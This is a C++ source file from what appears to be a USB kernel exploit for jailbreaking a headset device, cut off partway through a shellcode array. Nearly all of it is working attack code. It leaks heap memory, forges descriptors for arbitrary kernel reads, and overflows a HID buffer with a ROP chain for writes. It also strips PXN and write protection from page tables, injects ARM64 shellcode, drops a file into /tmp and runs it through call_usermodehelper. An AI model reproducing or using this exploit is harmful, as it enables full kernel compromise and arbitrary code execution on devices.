#include "rw.hpp"
#include "constants.hpp"
#include "logger.hpp"

#include <algorithm>
#include <chrono>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <thread>
#include <fstream>

static void pack_q(std::vector<uint8_t>& buf, uint64_t val) {
    uint8_t* p = reinterpret_cast<uint8_t*>(&val);
    buf.insert(buf.end(), p, p + 8);
}

bool KernelRW::setup_read() {
    if (_sauth_off) return true;

    const std::vector<uint8_t> sauth_marker = {0x1A, 0xCB, 0x0A, 0xFC, 0xBF, 0xFF, 0xFF, 0xFF};

    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0, 0x1000);

    if (heap.size() < 0x800) return false;

    auto it = std::search(heap.begin(), heap.end(), sauth_marker.begin(), sauth_marker.end());
    size_t found_off = -1;
    
    if (it != heap.end()) {
        found_off = std::distance(heap.begin(), it);
    }

    if (found_off < 0) {
        return false;
    }

    _sauth_off = found_off;
    forge_desc_off = found_off + constants::DESC_PTR_OFFSET;
    cached_heap = heap;

    forge_desc_val = constants::u64(heap.data() + forge_desc_off);
    
    return true;
}

uint64_t KernelRW::retrieve_get_alt() {
    int HEAP_SEND_SIZE = 0x1000;
    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0, HEAP_SEND_SIZE);
    return constants::u64(heap.data() + _sauth_off + constants::GET_ALT_OFFSET);
}

std::vector<uint8_t> KernelRW::_read_raw(uint64_t addr, size_t length) {
    if (cached_heap.empty()) return {};

    std::vector<uint8_t> buf = cached_heap;
    
    uint64_t base_forge = constants::REPORT_0xFF;
    std::memcpy(buf.data() + forge_desc_off, &base_forge, 8);
    
    const std::vector<uint8_t> null_sig = {0x09, 0x04, 0x01, 0x00, 0x00, 0x01, 0x01};
    std::vector<uint8_t> result;
    size_t offset = 0;

    size_t HEAP_SEND_SIZE = forge_desc_off + 8;
    std::vector<uint8_t> payload(buf.begin(), buf.begin() + std::min(HEAP_SEND_SIZE, buf.size()));
    if (usb->hid_set(0xFF, 0xFF, payload) == 0) return {};

    while (offset < length) {
        uint64_t target_addr = addr + offset;
        
        // Pointer to target address (8 bytes) + NULL (8 bytes)
        std::vector<uint8_t> addrVal(16, 0);
        std::memcpy(addrVal.data(), &target_addr, 8);

        usb->vendor_set(0xff, 0xff, addrVal);

        std::vector<uint8_t> desc = usb->get_config_desc(266);
        if (desc.empty()) return {};

        if (desc.size() > 16 && std::equal(null_sig.begin(), null_sig.end(), desc.begin() + 9)) {
            result.push_back(0);
            offset++;
        } else if (desc.size() > 9) {
            uint8_t b = desc[9];
            result.push_back(b);
            offset++;
            if (b > 0 && b < 200) {
                int extra = std::min({(int)b - 1, (int)desc.size() - 10, (int)length - (int)offset});
                if (extra > 0) {
                    result.insert(result.end(), desc.begin() + 10, desc.begin() + 10 + extra);
                    offset += extra;
                }
            }
        } else {
            return {};
        }
    }
    return result;
}

std::vector<uint8_t> KernelRW::_read_raw_rop(uint64_t addr, size_t length) {
    uint64_t base_desc_forge = sauth + constants::DESC_PTR_OFFSET;
    uint64_t base_forge = sauth + constants::AUTH1_DATA_OFFSET;

    write_u64_slow(base_desc_forge, base_forge);
    
    const std::vector<uint8_t> null_sig = {0x09, 0x04, 0x01, 0x00, 0x00, 0x01, 0x01};
    std::vector<uint8_t> result;
    size_t offset = 0;

    uint64_t last_target_addr = -1;

    while (offset < length) {
        uint64_t target_addr = addr + offset;
        
        for (int i = 0; i < 8; i++) {
            uint8_t new_byte = (target_addr >> (i * 8)) & 0xFF;
            uint8_t old_byte = (last_target_addr >> (i * 8)) & 0xFF;
            if (new_byte != old_byte || last_target_addr == (uint64_t)-1) {
                write_byte(base_forge + i, new_byte);
            }
        }
        last_target_addr = target_addr;

        std::vector<uint8_t> desc = usb->get_config_desc(266);
        if (desc.empty()) return {};

        if (desc.size() > 16 && std::equal(null_sig.begin(), null_sig.end(), desc.begin() + 9)) {
            result.push_back(0);
            offset++;
        } else if (desc.size() > 9) {
            uint8_t b = desc[9];
            result.push_back(b);
            offset++;
            if (b > 0 && b < 200) {
                int extra = std::min({(int)b - 1, (int)desc.size() - 10, (int)length - (int)offset});
                if (extra > 0) {
                    result.insert(result.end(), desc.begin() + 10, desc.begin() + 10 + extra);
                    offset += extra;
                }
            }
        } else {
            return {};
        }
    }
    return result;
}

std::vector<uint8_t> KernelRW::read(uint64_t addr, size_t length) {
    std::vector<uint8_t> data;
    size_t chunk_size = 0x1000;

    for (size_t i = 0; i < length; i += chunk_size) {
        usb->check_keep_alive();
        size_t clen = std::min(chunk_size, length - i);
        
        bool success = false;
        for (int attempt = 0; attempt < 10; attempt++) {
            std::vector<uint8_t> chunk;
            if (sauth)
                chunk = _read_raw_rop(addr + i, clen);
            else
                chunk = _read_raw(addr + i, clen);
            
            if (!chunk.empty()) {
                data.insert(data.end(), chunk.begin(), chunk.end());
                success = true;
                break;
            }
        }
        if (!success) {
            repair_descriptor();
            return {};
        }
    }
    repair_descriptor();
    return data;
}

uint64_t KernelRW::read_ptr(uint64_t addr) {
    auto d = read(addr, 8);
    return d.size() == 8 ? constants::u64(d.data()) : 0;
}

void KernelRW::repair_descriptor() {
    if (sauth) {
        uint64_t base_desc_forge = sauth + constants::DESC_PTR_OFFSET;
        write_u64_slow(base_desc_forge, forge_desc_val);
    }
    else {
        if (!cached_heap.empty()) {
            size_t HEAP_SEND_SIZE = forge_desc_off + 8;
            std::vector<uint8_t> payload(cached_heap.begin(), cached_heap.begin() + std::min(HEAP_SEND_SIZE, cached_heap.size()));
            usb->hid_set(0xFF, 0xFF, payload);
        }
    }
}

Registers KernelRW::discover_registers() {
    if (cached_registers.req != 0 && cached_registers.mep != 0 && cached_registers.x21 != 0) {
        return cached_registers;
    }

    if (cached_heap.empty()) {
        return cached_registers;
    }

    uint64_t config_ptr_off = _sauth_off + constants::CONFIG_PTR_OFFSET;
    if (config_ptr_off + 8 > cached_heap.size()) return cached_registers;

    uint64_t config = constants::u64(cached_heap.data() + config_ptr_off);
    auto cd = read(config, 0x40);
    if (cd.empty()) return cached_registers;

    uint64_t cdev = constants::u64(cd.data() + 0x30);
    auto cdev_d = read(cdev, 0x20);
    if (cdev_d.empty()) return cached_registers;

    cached_registers.req = constants::u64(cdev_d.data() + 0x08);
    auto req_d = read(cached_registers.req, 0x80);
    if (!req_d.empty()) cached_registers.x21 = constants::u64(req_d.data() + 0x70);

    uint64_t gadget = constants::u64(cdev_d.data() + 0x00);
    auto gd = read(gadget, 0x10);
    if (gd.empty()) return cached_registers;

    cached_registers.mep = constants::u64(gd.data() + 0x08);

    sauth = read_ptr(constants::SAUTH_SIEUSB);

    LOG_DEBUG << "[*] Discovery Results:\n"
              << "    - req: 0x" << std::hex << cached_registers.req << "\n"
              << "    - mep: 0x" << std::hex << cached_registers.mep << "\n"
              << "    - x21: 0x" << std::hex << cached_registers.x21 << " (spinlock)\n"
              << "    - sauth: 0x" << std::hex << sauth << "\n";
              

    return cached_registers;
}

bool KernelRW::setup_write() {
    Registers regs = discover_registers();
    repair_descriptor();

    if (regs.x21 != 0) {
        auto existing = read(constants::TEXT_STR_SC, 16);
        std::ostringstream oss;
        oss << "[";
        for (uint8_t b : existing) oss << " 0x" << std::hex << (int)b;
        oss << " ]\n";
        LOG_DEBUG << oss.str();

        if (existing == constants::STR_SHELLCODE) {
            LOG_DEBUG << "[+] Shellcode already present.\n";
            return true;
        }

        LOG_DEBUG << "[*] Injecting STR shellcode...\n";

        patch_rwx(constants::TEXT_STR_SC, 0x1000);
        patch_rwx(constants::BSS_DATA, 0x1000);

        uint64_t patchLE = 0x17FFFFEBD503201F;
        patch_rwx(0xffffffbffc0a656C, 0x1000);
        
        execute_tlb_flush();
        
        // Write shellcode byte-by-byte
        LOG_DEBUG << "    Writing " << std::dec << constants::STR_SHELLCODE.size() << " bytes to 0x" << std::hex << constants::TEXT_STR_SC << "\n";
        for (size_t i = 0; i < constants::STR_SHELLCODE.size(); i++) {
            write_byte(constants::TEXT_STR_SC + i, constants::STR_SHELLCODE[i]);
        }
        
        // Verify
        auto check = read(constants::TEXT_STR_SC, constants::STR_SHELLCODE.size());
        bool ok = (check == constants::STR_SHELLCODE);
        LOG_DEBUG << "    " << (ok ? "Verified" : "MISMATCH!") << "\n";

        write_u64_fast(0xffffffbffc0a656C, patchLE);

        return ok;
    }
    return false;
}

std::vector<uint8_t> KernelRW::_trigger_overflow(const std::vector<uint8_t>& payload) {
    int res = usb->hid_set(0xF0, 0x01, payload);
    return res > 0 ? std::vector<uint8_t>{1} : std::vector<uint8_t>{};
}

bool KernelRW::write_byte(uint64_t addr, uint8_t val) {
    std::vector<uint8_t> buf = {0xF0, 0x01};
    buf.insert(buf.end(), 62, 0x00);
    pack_q(buf, constants::STACK_COOKIE);
    pack_q(buf, 0); // X29
    pack_q(buf, constants::CLEAN_RETURN); // X30
    pack_q(buf, 0); // X19
    pack_q(buf, addr - 0xCD); // X20
    pack_q(buf, cached_registers.x21); // X21
    pack_q(buf, val); // X22

    return !_trigger_overflow(buf).empty();
}

bool KernelRW::write_u64_slow(uint64_t addr, uint64_t val) {
    for (int i = 0; i < 8; i++) {
        if (!write_byte(addr + i, (val >> (i * 8)) & 0xFF)) return false;
    }
    return true;
}

bool KernelRW::write_u64_fast(uint64_t addr, uint64_t val) {
    std::vector<uint8_t> buf = {0xF0, 0x01};
    buf.insert(buf.end(), 62, 0x00);
    pack_q(buf, constants::STACK_COOKIE);
    pack_q(buf, 0); // X29
    pack_q(buf, constants::TEXT_STR_SC); // X30
    pack_q(buf, val); // X19
    pack_q(buf, addr); // X20
    pack_q(buf, cached_registers.x21); // X21
    pack_q(buf, 0xFF); // X22

    return !_trigger_overflow(buf).empty();
}

bool KernelRW::write_data_slow(uint64_t addr, const std::vector<uint8_t>& data) {
    for (size_t i = 0; i < data.size(); i++) {
        if (!write_byte(addr + i, data[i])) return false;
    }
    return true;
}

bool KernelRW::write_data_fast(uint64_t addr, const std::vector<uint8_t>& data) {
    for (size_t i = 0; i < data.size(); i += 8) {
        size_t remaining = data.size() - i;
        if (remaining >= 8) {
            uint64_t val = *reinterpret_cast<const uint64_t*>(data.data() + i);
            if (!write_u64_fast(addr + i, val)) return false;
        } else {
            for (size_t j = 0; j < remaining; j++) {
                if (!write_byte(addr + i + j, data[i + j])) return false;
            }
        }
    }
    return true;
}

bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
    auto phys_to_virt = [](uint64_t phys) -> uint64_t {
        return phys - constants::PHYS_OFFSET + constants::PAGE_OFFSET_BASE;
    };

    LOG_DEBUG << "[*] Sweeping PTEs for " << std::dec << total_size << " bytes at 0x" << std::hex << base_vaddr << "...\n";

    uint64_t last_pgd_idx = -1;
    uint64_t pgd_entry = 0;
    
    uint64_t last_pmd_idx = -1;
    uint64_t pmd_entry = 0;

    // Loop through every 4KB page in the requested size
    for (uint64_t offset = 0; offset < total_size; offset += 0x1000) {
        uint64_t vaddr = base_vaddr + offset;
        
        uint64_t pgd_idx = (vaddr >> 30) & 0x1FF;
        uint64_t pmd_idx = (vaddr >> 21) & 0x1FF;
        uint64_t pte_idx = (vaddr >> 12) & 0x1FF;

        if (pgd_idx != last_pgd_idx) {
            pgd_entry = read_ptr(constants::SWAPPER_PG_DIR + (pgd_idx * 8));
            last_pgd_idx = pgd_idx;
            last_pmd_idx = -1; // Invalidate the cached PMD when crossing 1GB boundary
        }
        if (!(pgd_entry & 1)) continue;

        if (pmd_idx != last_pmd_idx) {
            uint64_t pmd_addr = phys_to_virt(pgd_entry & ~0xFFF);
            pmd_entry = read_ptr(pmd_addr + (pmd_idx * 8));
            last_pmd_idx = pmd_idx;
        }
        if (!(pmd_entry & 1)) continue;

        // Check if PMD is a 2MB block mapping
        if ((pmd_entry & 3) == 1) {
            uint64_t new_pmd = pmd_entry;
            new_pmd &= ~(1ULL << 53); // Clear PXN (Make Executable)
            new_pmd &= ~(1ULL << 7);  // Clear AP[2] (Make Writable)

            uint64_t pmd_addr = phys_to_virt(pgd_entry & ~0xFFF);
            uint64_t pmd_target_addr = pmd_addr + (pmd_idx * 8);

            for (int i = 0; i < 8; i++) {
                uint8_t old_byte = (pmd_entry >> (i * 8)) & 0xFF;
                uint8_t new_byte = (new_pmd >> (i * 8)) & 0xFF;
                if (old_byte != new_byte) {
                    if (!write_byte(pmd_target_addr + i, new_byte)) {
                        LOG_ERROR << "[-] Failed to patch byte " << i << " of PMD at 0x" << std::hex << pmd_target_addr << ".\n";
                        return false;
                    }
                }
            }
            
            // Advance offset to the end of the 2MB block so we don't unnecessarily check every 4KB page
            uint64_t next_pmd_boundary = (vaddr & ~0x1FFFFFULL) + 0x200000;
            uint64_t skip_bytes = next_pmd_boundary - vaddr;
            if (skip_bytes > 0x1000) {
                offset += (skip_bytes - 0x1000); 
            }
            pmd_entry = new_pmd;
        }
        // It's a standard Page Table Mapping (Level 3 PTEs)
        else if ((pmd_entry & 3) == 3) {
            uint64_t pte_addr = phys_to_virt(pmd_entry & ~0xFFF) + (pte_idx * 8);
            uint64_t pte_val = read_ptr(pte_addr);
            
            if (pte_val & 1) { // If PTE is valid
                uint64_t new_pte = pte_val;
                new_pte &= ~(1ULL << 53); // Clear PXN (Make Executable)
                new_pte &= ~(1ULL << 7);  // Clear AP[2] (Make Writable)

                for (int i = 0; i < 8; i++) {
                    uint8_t old_byte = (pte_val >> (i * 8)) & 0xFF;
                    uint8_t new_byte = (new_pte >> (i * 8)) & 0xFF;
                    if (old_byte != new_byte) {
                        if (!write_byte(pte_addr + i, new_byte)) {
                            LOG_ERROR << "[-] Failed to patch byte " << i << " of PTE at 0x" << std::hex << pte_addr << ".\n";
                            return false;
                        }
                    }
                }
            }
        }
    }
    
    LOG_DEBUG << "[+] Memory is now natively RWX!\n";
    return true;
}

bool KernelRW::execute_tlb_flush() {
    Registers regs = discover_registers();
    if (regs.req == 0 || regs.mep == 0 || regs.x21 == 0) {
        LOG_ERROR << "[-] Failed to discover ISR registers for TLB payload.\n";
        return false;
    }
    
    LOG_DEBUG << "[*] Writing TLB Shellcode to .bss...\n";
    std::vector<uint8_t> sc = constants::TLB_SHELLCODE;
    pack_q(sc, constants::RAW_SPIN_LOCK_ADDR);
    pack_q(sc, constants::ISR_EPILOGUE_ADDR);
    
    if (!write_data_slow(constants::BSS_DATA, sc)) return false;

    LOG_DEBUG << "[*] Defeating WXN/PXN hardware protections...\n";
    if (!patch_rwx(constants::BSS_DATA, 0x1000)) return false;

    LOG_DEBUG << "[*] Firing aligned TLB ROP chain...\n";
    std::vector<uint8_t> buf = {0xF0, 0x02};
    buf.insert(buf.end(), 62, 0x00);
    pack_q(buf, constants::STACK_COOKIE);
    
    // usb_auth_ctrl_complete epilogue
    pack_q(buf, 0);                                // X29
    pack_q(buf, constants::TLBI_GADGET_ADDR);      // X30
    
    // TLBI Gadget epilogue
    pack_q(buf, 0);                                // SP+0x00: X29 
    pack_q(buf, constants::BSS_DATA);              // SP+0x08: X30
    pack_q(buf, regs.req);                         // SP+0x10: X19 
    pack_q(buf, regs.mep);                         // SP+0x18: X20
    pack_q(buf, regs.x21);                         // SP+0x20: X21
    pack_q(buf, 0);                                // SP+0x28: Padding 

    int res = usb->hid_set(0xF0, 0x02, buf);
    return res > 0;
}

void replace_quad(std::vector<uint8_t>& buf, uint64_t marker, uint64_t value) {
    for (size_t i = 0; i <= buf.size() - 8; i++) {
        if (*reinterpret_cast<uint64_t*>(&buf[i]) == marker) {
            *reinterpret_cast<uint64_t*>(&buf[i]) = value;
            return;
        }
    }
}

bool KernelRW::trigger_workqueue(uint64_t target_func_addr) {
    uint64_t addr_work_struct = constants::TEXT_DATA + 0x50;
    uint64_t addr_irq         = constants::TEXT_DATA + 0x70;

    std::vector<uint8_t> payload;

    uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0; 
    uint64_t entry_addr = addr_work_struct + 0x08; 
    pack_q(payload, WORK_STRUCT_NO_POOL);
    pack_q(payload, entry_addr);
    pack_q(payload, entry_addr);
    pack_q(payload, target_func_addr);

    std::vector<uint8_t> stage1_sc = {
        0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
        
        0xA4, 0x02, 0x00, 0x58,  // 0x04: LDR X4, pc+84 -> Loads target_func_addr (from 0x58)
        0x24, 0x7B, 0x0B, 0xD5,  // 0x08: DC CVAU, X4
        0x24, 0x75, 0x0B, 0xD5,  // 0x0C: IC IVAU, X4
        0x84, 0x00, 0x01, 0x91,  // 0x10: ADD X4, X4, #64
        0x24, 0x7B, 0x0B, 0xD5,  // 0x14: DC CVAU, X4
        0x24, 0x75, 0x0B, 0xD5,  // 0x18: IC IVAU, X4
        0x84, 0x00, 0x01, 0x91,  // 0x1C: ADD X4, X4, #64
        0x24, 0x7B, 0x0B, 0xD5,  // 0x20: DC CVAU, X4
        0x24, 0x75, 0x0B, 0xD5,  // 0x24: IC IVAU, X4
        0x9F, 0x3B, 0x03, 0xD5,  // 0x28: DSB ISH
        0xDF, 0x3F, 0x03, 0xD5,  // 0x2C: ISB
        
        0x80, 0x00, 0x80, 0x52,  // 0x30: MOV W0, #4 (WORK_CPU_UNBOUND)
        0x61, 0x01, 0x00, 0x58,  // 0x34: LDR X1, pc+44 -> SYSTEM_WQ (from 0x60)
        0x21, 0x00, 0x40, 0xF9,  // 0x38: LDR X1, [X1]
        0x62, 0x01, 0x00, 0x58,  // 0x3C: LDR X2, pc+44 -> addr_work_struct (from 0x68)
        0x83, 0x01, 0x00, 0x58,  // 0x40: LDR X3, pc+48 -> QUEUE_WORK_ON (from 0x70)
        0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3 
        
        0x00, 0x00, 0x80, 0xD2,  // 0x48: MOV X0, #0
        0xFD, 0x7B, 0xC1, 0xA8,  // 0x4C: LDP X29, X30, [SP], #0x10
        0xC0, 0x03, 0x5F, 0xD6,  // 0x50: RET
        0x1F, 0x20, 0x03, 0xD5   // 0x54: NOP (Aligns exactly to 0x58)
    };
    
    pack_q(stage1_sc, target_func_addr);         // 0x58
    pack_q(stage1_sc, constants::SYSTEM_WQ);     // 0x60
    pack_q(stage1_sc, addr_work_struct);         // 0x68
    pack_q(stage1_sc, constants::QUEUE_WORK_ON); // 0x70

    payload.insert(payload.end(), stage1_sc.begin(), stage1_sc.end());
    write_data_fast(addr_work_struct, payload);

    write_u64_fast(read_ptr(constants::SAUTH_SIEUSB) + constants::GET_ALT_OFFSET, addr_irq);
    usb->trigger_get_alt();
    return true;
}

bool KernelRW::upload_to_tmp(const std::string& local_path, const std::string& remote_name) {
    std::ifstream elf_file(local_path, std::ios::binary);
    if (!elf_file) {
        LOG_ERROR << "[-] Could not read local file.\n";
        return false;
    }
    std::vector<uint8_t> elf_data((std::istreambuf_iterator<char>(elf_file)), {});

    uint64_t addr_filename   = rwx_base + 0x100;
    uint64_t addr_debug_flag = rwx_base + 0x200;
    uint64_t addr_shellcode  = rwx_base + 0x1000;
    uint64_t addr_elf_data   = rwx_base + 0x2000;

    LOG_DEBUG << "[*] Streaming " << elf_data.size() << " bytes to kernel vmalloc buffer...\n";
    write_data_fast(addr_elf_data, elf_data); 

    std::string target_path = "/tmp/" + remote_name;
    std::vector<uint8_t> filename_data(target_path.begin(), target_path.end());
    filename_data.push_back(0); 
    write_data_fast(addr_filename, filename_data);
    write_u64_fast(addr_debug_flag, 0);

    std::vector<uint8_t> dump_sc = {
        // Prologue
        0xFD, 0x7B, 0xBE, 0xA9,  // 0x00: STP X29, X30, [SP, #-32]!
        0xF3, 0x53, 0x01, 0xA9,  // 0x04: STP X19, X20, [SP, #16]
        0xFD, 0x03, 0x00, 0x91,  // 0x08: MOV X29, SP

        // filp_open(filename, O_CREAT|O_TRUNC|O_WRONLY (0x241), 0755)
        0xE0, 0x02, 0x00, 0x58,  // 0x0C: LDR X0, pc+92 -> lit_filename
        0x21, 0x48, 0x80, 0x52,  // 0x10: MOV W1, #0x241
        0xA2, 0x3D, 0x80, 0x52,  // 0x14: MOV W2, #0x1ED
        0xC3, 0x02, 0x00, 0x58,  // 0x18: LDR X3, pc+88 -> lit_filp_open
        0x60, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X3
        0xF3, 0x03, 0x00, 0xAA,  // 0x20: MOV X19, X0 (Save struct file*)

        // kernel_write(filp, buf, size, pos=0)
        0xE0, 0x03, 0x13, 0xAA,  // 0x24: MOV X0, X19
        0x81, 0x02, 0x00, 0x58,  // 0x28: LDR X1, pc+80 -> lit_elf_buf
        0xA2, 0x02, 0x00, 0x58,  // 0x2C: LDR X2, pc+84 -> lit_elf_size
        0x03, 0x00, 0x80, 0xD2,  // 0x30: MOV X3, #0  <-- THE FIX: loff_t passed by value
        0xA4, 0x02, 0x00, 0x58,  // 0x34: LDR X4, pc+84 -> lit_kernel_write
        0x80, 0x00, 0x3F, 0xD6,  // 0x38: BLR X4

        // filp_close(filp, NULL)
        0xE0, 0x03, 0x13, 0xAA,  // 0x3C: MOV X0, X19
        0x01, 0x00, 0x80, 0xD2,  // 0x40: MOV X1, #0
        0x62, 0x02, 0x00, 0x58,  // 0x44: LDR X2, pc+76 -> lit_filp_close
        0x40, 0x00, 0x3F, 0xD6,  // 0x48: BLR X2

        // Write Execution Success Flag
        0xE0, 0x66, 0x82, 0xD2,  // 0x4C: MOV X0, #0x1337
        0x41, 0x02, 0x00, 0x58,  // 0x50: LDR X1, pc+72 -> lit_debug_flag
        0x20, 0x00, 0x00, 0xF9,  // 0x54: STR X0, [X1]

        // Epilogue
        0xF3, 0x53, 0x41, 0xA9,  // 0x58: LDP X19, X20, [SP, #16]
        0xFD, 0x7B, 0xC2, 0xA8,  // 0x5C: LDP X29, X30, [SP], #32
        0xC0, 0x03, 0x5F, 0xD6,  // 0x60: RET
        0x1F, 0x20, 0x03, 0xD5   // 0x64: NOP (Aligns literal pool to 0x68)
    };

    pack_q(dump_sc, addr_filename);           // 0x68
    pack_q(dump_sc, constants::FILP_OPEN);    // 0x70
    pack_q(dump_sc, addr_elf_data);           // 0x78
    pack_q(dump_sc, elf_data.size());         // 0x80
    pack_q(dump_sc, constants::KERNEL_WRITE); // 0x88
    pack_q(dump_sc, constants::FILP_CLOSE);   // 0x90
    pack_q(dump_sc, addr_debug_flag);         // 0x98
    
    write_data_fast(addr_shellcode, dump_sc);

    LOG_DEBUG << "[*] Executing native kernel disk write...\n";
    trigger_workqueue(addr_shellcode);

    uint64_t debug_flag = 0;

    for (int i = 0; i < 10; i++) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
        
        debug_flag = read_ptr(addr_debug_flag);

        if (debug_flag == 0x1337) {
            LOG_DEBUG << "[+] File dropped to " << target_path << "\n";
            return true;
        }
    }
    
    LOG_ERROR << "[-] Failed to upload " << target_path << "\n";
    return false;
}

bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std::string>& args) {
    LOG_DEBUG << "[*] Preparing to execute: " << target_path << "\n";
    if (!args.empty()) {
        std::ostringstream oss;
        oss << "[*] With arguments: ";
        for (const auto& a : args) oss << a << " ";
        oss << "\n";
        LOG_DEBUG << oss.str();
    }

    uint64_t addr_exec_sc  = rwx_base + 0x300;
    uint64_t addr_debug    = rwx_base + 0x3E0;
    uint64_t addr_argv     = rwx_base + 0x400; // Array of pointers
    uint64_t addr_envp     = rwx_base + 0x600; // Array of pointers
    uint64_t addr_strings  = rwx_base + 0x800; // Start writing string data here

    uint64_t str_cursor = addr_strings;
    std::vector<uint64_t> argv_ptrs;

    uint64_t ptr_path = str_cursor;
    std::vector<uint8_t> path_data(target_path.begin(), target_path.end());
    path_data.push_back(0); // Null terminator
    write_data_fast(ptr_path, path_data);
    str_cursor += path_data.size();
    argv_ptrs.push_back(ptr_path);

    for (const auto& arg : args) {
        uint64_t ptr_arg = str_cursor;
        std::vector<uint8_t> arg_data(arg.begin(), arg.end());
        arg_data.push_back(0); // Null terminator
        write_data_fast(ptr_arg, arg_data);
        str_cursor += arg_data.size();
        argv_ptrs.push_back(ptr_arg);
    }
    argv_ptrs.push_back(0); // NULL terminator for the argv array

    std::vector<std::string> envs = {
        "PATH=/tmp/bin",
        "HOME=/",
        "TERM=xterm"
    };
    std::vector<uint64_t> envp_ptrs;

    for (const auto& env : envs) {
        uint64_t ptr_env = str_cursor;
        std::vector<uint8_t> env_data(env.begin(), env.end());
        env_data.push_back(0);
        write_data_fast(ptr_env, env_data);
        str_cursor += env_data.size();
        envp_ptrs.push_back(ptr_env);
    }
    envp_ptrs.push_back(0); // NULL terminator for the envp array

    for (size_t i = 0; i < argv_ptrs.size(); i++) {
        write_u64_fast(addr_argv + (i * 8), argv_ptrs[i]);
    }

    for (size_t i = 0; i < envp_ptrs.size(); i++) {
        write_u64_fast(addr_envp + (i * 8), envp_ptrs[i]);
    }

    write_u64_fast(addr_debug, 0);

    std::vector<uint8_t> exec_sc = {
        0xFD, 0x7B, 0xBE, 0xA9,  // 0x00: STP X29, X30, [SP, #-32]!
        0xFD, 0x03, 0x00, 0x91,  // 0x04: MOV X29, SP

        // call_usermodehelper(path, argv, envp, UMH_WAIT_EXEC)
        0x80, 0x01, 0x00, 0x58,  // 0x08: LDR X0, pc+48 -> lit_path
        0xA1, 0x01, 0x00, 0x58,  // 0x0C: LDR X1, pc+52 -> lit_argv
        0xC2, 0x01, 0x00, 0x58,  // 0x10: LDR X2, pc+56 -> lit_envp
        0x03, 0x00, 0x80, 0xD2,  // 0x14: MOV X3, #1 (UMH_WAIT_EXEC)
        0xC4, 0x01, 0x00, 0x58,  // 0x18: LDR X4, pc+56 -> lit_call_usermodehelper
        0x80, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X4

        // Write Execution Success Flag
        0xC0, 0x01, 0x00, 0x58,  // 0x20: LDR X0, pc+56 -> lit_debug_flag
        0xE1, 0x66, 0x82, 0xD2,  // 0x24: MOV X1, #0x1337
        0x01, 0x00, 0x00, 0xF9,  // 0x28: STR X1, [X0]

        // Epilogue
        0xFD, 0x7B, 0xC2, 0xA8,  // 0x2C: LDP X29, X30, [SP], #32
        0xC0, 0x03, 0x5F, 0xD6,  // 0x30: RET
        0x1F, 0x20, 0x03, 0xD5   // 0x34: NOP (Align)
    };
    
    // Literal Pool
    pack_q(exec_sc, ptr_path);                        // 0x38 (Points to the string directly)
    pack_q(exec_sc, addr_argv);                       // 0x40 (Points to the array of pointers)
    pack_q(exec_sc, addr_envp);                       // 0x48 (Points to the array of pointers)
    pack_q(exec_sc, constants::CALL_UMH);             // 0x50
    pack_q(exec_sc, addr_debug);                      // 0x58

    write_data_fast(addr_exec_sc, exec_sc);

    LOG_DEBUG << "[*] Triggering shellcode...\n";
    trigger_workqueue(addr_exec_sc);

    for (int i = 0; i < 100; i++) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
        if (read_ptr(addr_debug) == 0x1337) {
            LOG_DEBUG << "[+] " << target_path << " finished execution sequence.\n";
            return true;
        }
    }
    
    LOG_ERROR << "[-] Failed to execute ELF. Check kernel log.\n";
    return false;
}

bool KernelRW::setup_jb_env() {
    uint64_t __vmalloc_addr = constants::__VMALLOC_ADDR;
    uint64_t get_alt_ptr_addr = read_ptr(constants::SAUTH_SIEUSB) + constants::GET_ALT_OFFSET;

    // We already have the address, or we can get it from the headset in a known place.
    uint64_t current_ptr = read_ptr(constants::TEXT_ALLOC_BASE);

    if (current_ptr != rwx_base) {
        LOG_DEBUG << "[*] Detected existing allocation at 0x" << std::hex << current_ptr << "\n";
        rwx_base = current_ptr;
    }
    
    if (current_ptr == 0) {
        LOG_DEBUG << "[*] Setting up jailbreak env\n";
        
        uint64_t addr_worker      = constants::TEXT_DATA + 0x00; // Stage 2
        uint64_t addr_work_struct = constants::TEXT_DATA + 0x60; // 32-byte struct
        uint64_t addr_irq         = constants::TEXT_DATA + 0x80; // Stage 1
        uint64_t addr_alloc_ptr   = constants::TEXT_DATA + 0xD8; // Final result slot
        uint64_t addr_debug_flag  = constants::TEXT_DATA + 0xE0; // Debug flag slot

        write_u64_fast(addr_alloc_ptr, 0);
        write_u64_fast(addr_debug_flag, 0);

        std::vector<uint8_t> payload;

        // __vmalloc(256KB, GFP_KERNEL, PAGE_KERNEL_EXEC)
        std::vector<uint8_t> stage2_sc = {
            0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
            0xFD, 0x03, 0x00, 0x91,  // 0x04: MOV X29, SP
            
            // Arg 0: Size (256 KB = 0x40000)
            0x00, 0x00, 0x80, 0xD2,  // 0x08: MOV X0, #0
            0x80, 0x00, 0xA0, 0xF2,  // 0x0C: MOVK X0, #0x4, LSL #16 
            
            // Arg 1: GFP Mask (GFP_KERNEL = 0xD0)
            0x01, 0x1A, 0x80, 0xD2,  // 0x10: MOV X1, #0xD0
            
            // Arg 2: Protection (PAGE_KERNEL_EXEC = 0x713)
            0x62, 0xE2, 0x80, 0xD2,  // 0x14: MOV X2, #0x713
            
            0x83, 0x01, 0x00, 0x58,  // 0x18: LDR X3, pc+48 (Loads __vmalloc_addr from 0x48)
            0x60, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X3 
            
            0x81, 0x01, 0x00, 0x58,  // 0x20: LDR X1, pc+48 (Loads addr_alloc_ptr from 0x50)
            0x20, 0x00, 0x00, 0xF9,  // 0x24: STR X0, [X1] (Save result to BSS)
            
            // --- Write Debug Flag (0x1337) ---
            0xE2, 0x66, 0x82, 0xD2,  // 0x28: MOV X2, #0x1337
            0x61, 0x01, 0x00, 0x58,  // 0x2C: LDR X1, pc+44 (Loads addr_debug_flag from 0x58)
            0x22, 0x00, 0x00, 0xF9,  // 0x30: STR X2, [X1]
            // ---------------------------------
            
            0x00, 0x00, 0x80, 0xD2,  // 0x34: MOV X0, #0
